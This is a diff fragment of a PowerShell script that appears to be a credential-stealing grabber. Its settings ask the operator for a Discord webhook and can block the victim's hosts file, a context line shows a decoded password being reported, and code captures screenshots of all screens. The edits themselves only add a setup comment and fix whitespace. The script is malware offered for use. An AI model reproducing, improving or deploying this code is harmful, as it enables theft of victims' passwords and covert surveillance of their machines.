@@ -1,4 +1,4 @@
-$webhook = "YOUR_WEBHOOK_HERE" 
+$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU SET $autoupdate = $true, INSTEAD REPLACE "AUTOUPDATE WEBHOOK" IN LINE 44 WITH YOUR DISCORD WEBHOOK
 $debug = $false
 $autoupdate = $false
 $blockhostsfile = $true
@@ -850,8 +850,8 @@ Pass: $decodedPass
      
     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
-    $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+    $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
+    $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
     $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
     $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
     $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
